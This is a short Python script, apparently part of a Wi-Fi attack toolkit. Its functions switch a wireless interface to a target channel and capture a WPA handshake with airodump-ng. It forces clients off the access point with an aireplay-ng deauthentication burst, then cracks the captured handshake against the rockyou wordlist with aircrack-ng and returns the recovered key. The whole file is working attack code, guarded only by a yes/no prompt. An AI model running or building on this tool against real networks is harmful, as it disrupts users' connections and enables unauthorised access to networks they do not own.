from colorama import Fore
import subprocess
import time
import os

def capture_handshake(iface, bssid, channel, client_mac=None):
    print(f"{Fore.YELLOW}WARNING! Deauthentication is an aggressive action. Continue? (yes/no)")
    if input().lower() != "yes":
        return None

    os.system(f"iwconfig {iface} channel {channel}")
    cap_file = f"temp/handshake_{bssid.replace(':', '')}.cap"

    airodump = subprocess.Popen([
        "airodump-ng", iface, "--bssid", bssid, "-c", str(channel), "-w", "temp/handshake"
    ])

    time.sleep(5)
    subprocess.run(["aireplay-ng", "--deauth", "10", "-a", bssid, "-c", client_mac or "", iface])

    time.sleep(15)
    airodump.terminate()

    if os.path.exists(cap_file):
        print(f"{Fore.GREEN}Handshake saved: {cap_file}")
        return cap_file
    return None

def crack_handshake_return(cap_file, wordlist="~/Downloads/rockyou.txt"):
    if not os.path.exists(wordlist):
        print(Fore.RED + f"[!] Dictionary not found: {wordlist}")
        return None
    
    print(f"[*] Cracking password from {wordlist}...")
    
    result = subprocess.run(
        ["aircrack-ng", cap_file, "-w", wordlist],
        capture_output=True,
        text=True
    )
    
    for line in result.stdout.split("\n"):
        if "KEY FOUND!" in line:
            import re
            match = re.search(r"\[ (.*?) \]", line)
            if match:
                return match.group(1)
    
    return None